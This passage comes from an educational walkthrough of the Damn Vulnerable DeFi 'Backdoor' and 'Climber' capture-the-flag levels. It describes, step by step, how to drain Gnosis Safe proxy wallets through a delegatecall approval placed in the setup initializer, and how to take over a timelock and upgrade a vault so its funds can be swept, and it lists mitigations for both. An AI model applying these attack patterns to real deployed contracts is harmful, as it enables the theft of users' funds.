Also, by reading the challenge `expect` on the test file we see that every condition (but one) is satisfied by only executing `proxyCreated` (the zero address can't be a wallet, and the beneficiaries array will be empty for each owner because each `proxyCreated` call removes the owner). So the only thing we need to find a way te get the right of those 40 DVT tokens. We said enough.

### Solution - Part One: Proxies
On this part we will explain the logic behind the *Gnosis Safe* implementation in here.  
The way to trigger the `proxyCreated` function is by executing in some way `createProxyWithCallback` within the `GnosisSafeProxyFactory` contract. 

By looking closer, there is no access control or requirement in order to execute that proxy creation function. The things we need are the input parameters. We need to understand how to prepare this mis-en-place in order to cook this dish. 

    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) public returns (GnosisSafeProxy proxy) {
        uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
        proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
        if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
    }


1) `singleton`: The Gnosis comment is not that explanatory. They say that this is "Address of singleton contract". They are basically saying that an apple is indeed an apple... This parameter is the main safe. The Gnosis Safe instance. On this level, it is called `masterKey`. 

**Why it is needed?**

It is passed as a parameter both of `createProxyWithNonce` and `proxyCreated`. Within the latter it is available to check the authenticity of the **masterKey**. But for the first one it is passed to the proxy creation and its deployment afterwards. Why it is targeting the masterKey anyways...? We'll dig into it in a moment.

2) `initializer`: It seems that the Gnosis team was on the mood to be concise. But this parameter will be explained later on. For now, think it as the payload data to perform an action encoded as bytes.

**Why it is needed?**

It is passed as a parameter of the proxy creation. Then, when the proxy is deployed by internally calling `deployProxyWithNonce` it is passed along with a salt into the `create2` Yul method under the assembly. That assembler reassigns to the proxy variable the output of the `create2(v,p,n,s)` instruction. This instruction creates a new address. Its parameters from left to right. Wei sent to the created address, the sum of `0x20` and `deploymentData`, the word of 32bytes located at the memory address of `deploymentData` and the salt. The address will be created with this logic: `keccak256(0xff . this . s . keccak256(mem[p…(p+n)))`. So we are passing the initializer somehow to the new proxy contract. 

3) `saltNonce`: According to Gnosis: *Nonce that will be used to generate the salt to calculate the address of the new proxy contract.*

4) `callback`: Where the magic happens in some way. This input is the current `WalletRegistry` instance that allows this factory to call the `proxyCreated` function within the `callback` contract.


Well. This seems like a dead end. But... if we follow the callback logic we see that there's a `require` statement that gives us an idea of an important step, precisely on `line 77`. In other words, it is trying to say that the given instructions passed as `initializer` , need to perform **first** the initialization of the `GnosisSafe` (that's why it is called after initializer and not Carlos). 

<p align="center">
  <br/>
  <img src="./images/backdoor-proxies.png">
  <br/>
</p>


This is also a recommendation of OpenZeppelin regarding constructors and proxies. They recommend to use initializer functions rather than constructors. This is mainly because how proxy calls work and where is indeed stored the data. Its a matter of how the data is stored and retrieved from data slots within an execution. The most important concept we need to have clear is how data changes and *where* it changes when a proxy contract comes into action. Short story, the proxy contracts works with delegations. A delegation is basically running the logic of an implementation contract which modifies the state within the caller. In other words, the proxy contract executes the logic of the implementation contract but all the changes and impacts that the logic implies, are applied to the proxy. If you are more interested about how proxies work and how they provide upgradeability, we encourage you to read [this medium post](https://medium.com/coinmonks/upgradeable-proxy-contract-from-scratch-3e5f7ad0b741#:~:text=Proxy%20contract%20is%20a%20contract,that%20is%20called%20implementation%20contract.).

So, the first instruction of the payload must be the call to the `setup` function within `GnosisSafe`. Lets take a look to that function. 

    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external {
        // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
        setupOwners(_owners, _threshold);
        if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
        // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
        setupModules(to, data);

        if (payment > 0) {
            // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
            // baseGas = 0, gasPrice = 1 and gas = payment => amount = (payment + 0) * 1 = payment
            handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
        }
        emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
    }

Remember that the inception of this function relies on the deployment logic thanks to encoding within the `initializer` parameter and passing it as calldata.

Well, this function in order to be called requires several parameters. Each one of them is explained within the `WalletRegistryCracker` solution contract. In here we will explain the logic behind this setup call.

This function setups the owner addresses as part of the multisig feature providing several features. The first one is that it gives the chance to perform `delegatecalls` which instructions are encoded within the calldata `data` to the `to` contract. The second one is that it allows to assign a `fallbackHandler` and it also provides the feature to setup payment tokens, their amount and who receives them. In here we will focus in the `delegatecall` feature. As we mentioned before, remember that this type of call allows to modify the callers state by executing foreign logic.

### Solution - Part Two: Token Flows
In order to figure out what to do, we need to track the tokens and how do they flow on this system. They will be flowing as the following:

1) The `WalletRegistry` starts by the challenge initial conditions with 40 DVT tokens and with the users (Alice, Bob, Charlie, David) registered as beneficiaries. So, the tokens start at the `WalletRegistry` contract.
2) When a proxy is created with the `createProxyWithCallback` method, it calls the `proxyCreated` function within the Registry and the logic inside that function transfers in the end the `TOKEN_PAYMENT` (10 ether) amount from the registry to the recently created proxy.

        WalletRegistry ---> each Proxy
        10 eth         --->  


So this gives us the idea that we will need a loop somewhere in order to target every user (40 eth held inside the first contract and each `proxyCreated` call transfers only 10).

### Solution - Part Three: Managing to Approve
So far, the claimed tokens remain within the proxy contract instead of being held by the owner. This gives us the advantage to get them in a very particular way. By combining two concepts used separately in other levels, we may crack this challenge. We need to combine both the delegatecalls with approvals. Currently, each proxy lacks the logic to give approval on an ERC20 token, but it can indeed perform delegatecalls while being set up. If we follow the logic explained before we will be able to do so while setting up by:

1) Targeting an Implementation contract that provides the approval logic (`to`)
2) Passing the required encoded calldata (`data`)

We will remind again that the implementation provides the logic but because this is a delegation call, the state modified will be as if it was called from each proxy contract. This allows us to perform an approval because it will be as if it was ran by the proxy as a whole. By approving the attacker contract, it will have the right to call the `transferFrom` ERC20 method and perform the theft.

### Solution - Part Four: Implementation
The `WalletRegistryCracker.sol` attacks the Wallet Registry by combining delegations and approvals. Essentially, what it does is it passes two calldata parameters into the external functions in order to perform both the initialization and inside that, the approval. The approval encoded instructions are passed as a parameter of the initialization calldata. So in reality, only one calldata is passed during the proxy creation process that contains the encoded payload. 

Each parameter is explained before. But the call flow for a single user theft will be something like this:

1) Getting the user address and creates a array of dimension one with that address.
2) Encoding the approval payload that calls `triggerApproveForAll` which needs both the token address and the spender to be passed as inputs.
3) Encoding the initializer payload and get a salt in order to create the proxy later on.
4) Creating the proxy with callback and getting that instance.
5) Because the proxy creation passed also the `delegatecall` to our `triggerApproveForAll` function, they have technically the instructions to allow the attacker contract to do whatever it wants with the tokens.
6) Having the allowance, the contract can perform a `transferFrom` and take the tokens out of the proxy and transfer them to the attacker.

7) Rinse and repeat this for each user!

NOTE: The `proxyCreated` function within the `WalletRegistry` will be completely executed before needing to execute the step 6) and because of that, the tokens are available on the proxy contract.


### Learnings - Mitigations
- Beware on the `delegatecall` call flow and where it ends. The last contract of the delegation chain can perform any action and they may harm the desired implementation. Within [this video](https://www.youtube.com/watch?v=R1eZCmR91vQ&t=4781s) of Scott Bigelow it is explained how delegatecalls can be used to selfdestruct contracts maliciously.
- Check always how and when the tokens within the contract are supposed to flow. Think them as a liquid. When, who, and how will the tokens move within the protocol? Who can control it? Who can't? Do we have flow assurance that depends only on states of the protocol? Are there some external actors or parameters that can compromise that flow assurance? If a whole process needs to be seen in a macro way, we can't treat tokens as single points of data. In a macro way treating they as flows it helps sometimes to identify vulnerabilities.
- This delegation problem can be analyzed with the isomorphism of a leaking tank. You trust that the contractor will work ethically it but instead of that, he decides to open even more the leaking hole and derive all the water towards his tank. Just because you delegated him the job by trusting his methods. He will be with in power of the water later on and you won't have anything but thirst. The state change (volume, amount of water) impacts directly on you but how the whole process was implemented is responsibility of the contractor. 

Coming from business and administration theory: 

**You can delegate a task but the underlying responsibility of its outcomes is always yours!**


## 12) Climber

### Catch - Hints
If you've got this far, kudos to you! This is the last one (so far). Think hard about the `checks, effects, interactions` motto. As difficult as this level may seem if you spot something odd (also typical in reentrant contracts), you will crack this level.

### Solution
The core of this level vulnerability resides within the `line 108` under the `ClimberTimelock.sol` contract. This is because they are giving anyone the chance to execute any instruction towards any target contract before checking if that action was properly scheduled before.
But (there is always a but sadly) it is needed to schedule the calls (before or after executing them), otherwise the whole execution will be reverted like a cascade when the `line 108` runs. Also, both `execute` and `schedule` can have multiple steps (executed or scheduled) in a single call.

So far we know that we can freely execute actions thanks to this enormous bug making sure that within some call of the array we need to schedule the other calls in order to have the transaction mined.

What if we can steal the ownership, get the proposer role, change the delay time and schedule all in one single execute call? That's what we are going to do. The instructions that we need to pass to `execute` are the following:

1) Change the delay of the contract and set it to zero. This allows the whole process to work without waiting for cooldowns.
2) Grant the `proposer` role to the attacker contract (otherwise, the `onlyProposer` modifier won't let it schedule the actions).
3) Steal the ownership of the implementation contract. This will give us the power to upgrade the implementation. Even if having the ownership was pointless, just the fact of stealing an ownership is considered an attack itself. Free ownership, why not?
4) Schedule the steps 1, 2, 3 so the whole execution is properly mined.

As you may see, those steps don't perform any transfer or withdrawal of the tokens held by the vault so clearly there is something missing...

Yes, indeed. Everything we did while executing the four steps from before was done entirely to perform the step 3). Stealing the ownership in order to upgrade the proxy implementation. As we have seen on the Backdoor level, proxies call the implementation logic under the implementation contract and the state changes are reflected on the proxy. This is what we need to do with the newer implementation. 

By simply changing the access control of the `sweepFunds` function, we will be able to steal everything from the vault. By changing the `onlySweeper` modifier for `onlyOwner` we will be able to steal everything. Please note that the data structure of the proxy and implementation require having continuity on several data slots allocated to prior declared variables. That's why we are defining `_lastWithdrawalTimestamp` and `_sweeper`even if we don't use them later on (you can try deploying the contract without them and you will see the `Error: New storage layout is incompatible` along other errors pointing to each undeclared variable).

A note on this. This level is using the OpenZeppelin safe proxy suite in order to perform upgrades "safely". The security of the upgrades in here relies on how the contracts are upgraded and what things are allowed within them. The vulnerability of this level does not comes from the proxies itself. It exists because of not respecting the `checks, effects, interactions` security approach on Solidity and thus having an access control leak.
If no secure proxies are implemented in here, the hijack could also have been performed in a fancier and funnier way. We could have created within the new implementation contract a function that calls inside `selfdestruct` with our attacker contract as the receiver of the forwarded funds. Because the logic is only read from the implementation and the state impacts on the proxy if the proxy calls `selfdestruct` from an implementation contract, it will be selfdestructed and that operation forwards all the tokens held inside the destructed contract towards a receiver (even if the receiver lacks from a payable fallback function). OpenZeppelin upgradeable contracts check if there is an implementation of selfdestruct and reverts the whole upgrade.

This level has two contracts, the scheduler and executioner of the instructions to the TimeLock (`ClimberCracker.sol`) and the new implementation of the proxy (`CrackerNewImpl.sol`). Both contracts are held within the level folder.

### Learnings - Mitigations
- Trying to respect the "checks, effects, interactions" while creating and designing functions is a must. Sometimes you will see that some `require` statemets later on a function and most of the cases is because they are using variables that are retrieved within the function call. As a rule of thumb, whenever it's possible try to put the logical checks before everything else.
- Checking how the access control may be leaked is also helpful. Trying to follow an execution until it ends the chain of calls and see if there is a vulnerable step, is a good strategy. Also, this is helpful to track reentrancies (some of these attacks can be mitigated by using modifiers on a relevant part of the call chain).
- Using safe proxy-implementation contracts like the ones provided OpenZeppelin prevents having further vulnerabilites regarding upgradeable suites. If you are interested on more problems regarding proxies, you can read [this article written by Tincho Abbate](https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070) (the creator of Damn Vulnerable Defi) where he talks about functions clashing attacks within proxies.

**Whenever it is possible, the checks go upfront. In Solidity and while doing business also...**


## Credits & Special Thanks

- Thanks a lot to `@tobaias` for checking the whole file for mistakes and making important corrections that leveled up this educational walkthrough!

- Thanks a lot for reading and being with me all along this journey! Hope you learned much more than me while making these challenges. If you can anything to say, mention or even correct, every comment is welcome! 

Lior.